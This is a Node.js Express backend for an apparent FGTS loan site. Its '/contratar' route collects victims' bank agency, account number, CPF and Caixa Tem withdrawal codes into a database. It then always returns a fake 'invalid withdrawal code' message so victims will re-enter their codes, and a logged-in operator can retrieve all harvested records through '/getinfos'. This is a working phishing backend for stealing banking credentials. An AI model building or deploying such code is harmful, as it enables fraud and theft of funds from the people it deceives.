import express from 'express';
import bcrypt from 'bcryptjs';
import conexao from './conexao.js';
import Joi from 'joi'; // Biblioteca de validação
import session from 'express-session';
import cors from 'cors';
import sqlite3 from 'sqlite3';

// Criando a aplicação express
const app = express();
app.use(express.json());

app.use(cors({
    origin: 'https://fgts-hl3z.vercel.app/',
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Criando o banco de dados SQLite em memória
const db = new sqlite3.Database('./fgtsnovo.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao banco de dados SQLite:', err.message);
    } else {
        console.log('Conectado ao banco de dados SQLite');
    }
});

// Configuração de sessão
app.use(session({
    secret: 'dakota@fgts',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        httpOnly: true,
        maxAge: 3600000
    }
}));

// Schema de validação para login
const loginSchema = Joi.object({
    usuario: Joi.string().email().required(),
    senha: Joi.string().min(6).required()
});

// Rota de Login
app.post('/login', async (req, res) => {
    const { usuario, senha } = req.body;

    const { error } = loginSchema.validate({ usuario, senha });
    if (error) {
        return res.status(400).json({ erro: 'Usuário ou senha inválidos.' });
    }

    try {
        const query = "SELECT * FROM usuarios WHERE usuario = ?";
        conexao.query(query, [usuario], async (erro, result) => {
            if (erro) {
                return res.status(500).json({ erro: 'Erro no servidor de banco de dados.' });
            }

            if (result.length === 0) {
                return res.status(400).json({ erro: 'Usuário ou senha incorretos.' });
            }

            const usuarioEncontrado = result[0];
            const senhaCorreta = await bcrypt.compare(senha, usuarioEncontrado.senha);

            if (!senhaCorreta) {
                return res.status(400).json({ erro: 'Usuário ou senha incorretos.' });
            }

            // Configurando a sessão após login bem-sucedido
            req.session.usuarioId = usuarioEncontrado.id;
            req.session.usuario = usuarioEncontrado.usuario;

            req.session.save((err) => {
                if (err) {
                    return res.status(500).json({ erro: 'Erro ao salvar sessão.' });
                }
                return res.status(200).json({ mensagem: 'Login bem-sucedido.', redirectTo: '/dashboard' });
            });
        });
    } catch (error) {
        return res.status(500).json({ erro: 'Erro no servidor.' });
    }
});

// Rota da Dashboard
app.get('/dashboard', (req, res) => {
    if (req.session.usuarioId) {
        res.json({
            mensagem: 'Bem-vindo à sua dashboard!',
            usuario: req.session.usuario
        });
    } else {
        res.status(401).json({ erro: 'Você precisa estar logado para acessar a dashboard.' });
    }
});

// Rota para obter dados bancários
app.get('/getinfos', (req, res) => {
    if (req.session.usuarioId) {
        const query = "SELECT * FROM dados";

        conexao.query(query, (err, results) => {
            if (err) {
                return res.status(500).json({ erro: 'Erro interno do servidor.' });
            }

            if (results.length > 0) {
                res.json({ dados: results });
            } else {
                res.status(404).json({ erro: 'Nenhum dado encontrado.' });
            }
        });
    } else {
        res.status(401).json({ erro: 'Você precisa estar logado para acessar as informações.' });
    }
});

// Rota para logout
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).send({ erro: 'Erro ao tentar deslogar.' });
        }
        res.clearCookie('connect.sid');
        res.status(200).send({ mensagem: 'Logout realizado com sucesso.' });
    });
});

// Rota para contratar empréstimo
app.post('/contratar', (req, res) => {
    const { agencia, conta, codigoSaque, cpf } = req.body;

    // Validação simples para dados de empréstimo
    if (!agencia || !conta || !codigoSaque || !cpf) {
        return res.status(400).json({ erro: 'Todos os campos são obrigatórios.' });
    }

    const query = 'INSERT INTO dados (agencia, conta, codigo_saque, cpf) VALUES (?, ?, ?, ?)';
    const values = [agencia, conta, codigoSaque, cpf];

    conexao.query(query, values, (err, results) => {
        if (err) {
            return res.status(500).json({ erro: 'Erro ao processar a solicitação.' });
        }

        res.status(200).json({
            status: 'sucesso',
            message: 'Código de saque inválido, verifique o código em seu aplicativo Caixa Tem!'
        });
    });
});

// Exportando a função serverless
export default function handler(req, res) {
    app(req, res);
}
